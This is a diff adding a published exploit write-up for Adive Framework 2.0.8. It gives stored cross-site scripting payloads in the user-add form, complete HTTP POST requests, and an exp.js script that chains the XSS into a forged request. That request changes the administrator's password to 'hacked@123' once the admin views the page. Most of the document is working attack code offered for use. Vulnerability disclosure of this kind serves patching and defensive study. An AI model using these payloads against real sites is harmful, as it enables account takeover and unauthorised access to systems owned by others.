@@ -1,0 +1,88 @@
+# Exploit Title:  Adive Framework 2.0.8 - Persistent Cross-Site Scripting
+# Exploit Author: Sarthak Saini
+# Dork: N/A
+# Date: 2020-01-18
+# Vendor Link : https://www.adive.es/
+# Software Link: https://github.com/ferdinandmartin/adive-php7
+# Version: 2.0.8
+# Category: Webapps
+# Tested on: windows64bit / mozila firefox 
+
+1) Persistent Cross-site Scripting at user add page 
+
+Description : The parameter 'userUsername=' is vulnerable to Stored Cross-site scripting
+ 
+Payload:- <script>alert(1)</script>
+
+POST /admin/user/add HTTP/1.1
+Host: 192.168.2.5
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Origin: http://192.168.2.5
+DNT: 1
+Connection: close
+Referer: http://192.168.2.5/admin/user/add
+Cookie: PHPSESSID=3rglrbjn0372tf97voajlfb1j4
+Upgrade-Insecure-Requests: 1
+
+userName=test&userUsername=<script>alert('xss')</script>&pass=test&cpass=test&permission=3
+
+
+|----------------------------------------------------------------------------------
+
+
+2) account takeover - cross side request forgery 
+
+
+Description : attacker can craft a malicious javascript and attach it to the stored xss, when admin visits the /admin/user page the payload will trigger.
+
+-> Save the payload as exp.js
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==--==-
+function execute()
+{
+  var nuri ="http://192.168.2.5/admin/config";
+  xhttp = new XMLHttpRequest();
+  xhttp.open("POST", nuri, true);
+  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  xhttp.withCredentials = "true";
+  var body = "";
+  body += "\r\n\r\n";
+  body += 
+	"userName=Administrator&confPermissions=1&pass=hacked@123&cpass=hacked@123&invokeType=web";
+  xhttp.send(body);
+  return true;
+}
+
+execute();
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==--==-
+
+-> Start a server and host the exp.js. Send the exp.js file in the xss payload
+
+Payload:- <script src="http://192.168.2.5/exp.js"></script>
+
+POST /admin/user/add HTTP/1.1
+Host: 192.168.2.5
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Origin: http://192.168.2.5
+DNT: 1
+Connection: close
+Referer: http://192.168.2.5/admin/user/add
+Cookie: PHPSESSID=3rglrbjn0372tf97voajlfb1j4
+Upgrade-Insecure-Requests: 1
+
+userName=%3Cscript+src%3D%22http%3A%2F%2F192.168.2.5%2Fexp.js%22%3E%3C%2Fscript%3E&userUsername=test&pass=test&cpass=test&permission=3
+
+
+-> As soon as admin will visit the page the payload will be triggered and the admin password will be changed to hacked@123
+
+|-----------------------------------------EOF-----------------------------------------
